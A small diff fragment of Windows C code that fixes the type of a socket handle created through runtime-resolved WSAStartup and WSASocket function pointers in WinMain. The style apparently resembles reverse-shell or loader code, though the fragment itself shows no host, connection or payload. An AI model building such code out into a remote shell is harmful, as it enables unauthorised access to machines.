@@ -29,7 +29,7 @@ int STDCALL WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
                     WSADATA         WSAStruct        = {0};
 
                     if (WSAStartupFunc(MAKEWORD(2, 2), &WSAStruct) == 0) {
-                        unsigned long long *result  = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+                        unsigned long long result  = WSASocketFunc(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
 
                         if (result != INVALID_SOCKET) {
                             SOCKADDR_IN SocketAddr      = {0};
